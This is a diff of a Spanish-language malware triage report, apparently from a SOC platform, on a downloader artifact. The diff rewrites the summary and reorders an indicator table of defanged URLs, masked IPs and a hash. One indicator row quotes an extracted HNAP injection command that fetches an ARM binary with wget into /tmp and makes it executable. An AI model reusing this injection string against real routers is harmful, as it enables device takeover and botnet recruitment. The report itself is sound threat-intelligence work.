@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 387 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `SetAccessPointMode` en `hxxp://purenetworks[.]com/HNAP1/SetAccessPointMode`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,11 +54,11 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
-| ip | 201.51.13.XXX | static_analysis |
 | url | hxxp://purenetworks[.]com/HNAP1/SetAccessPointMode | strings |
-| hash | 3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15 | static_analysis |
+| ip | 201.51.13.XXX | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
 | command | <IsAccessPoint>`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai | strings |
+| hash | 3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15 | static_analysis |
 
 ## 🔎 Triage
 
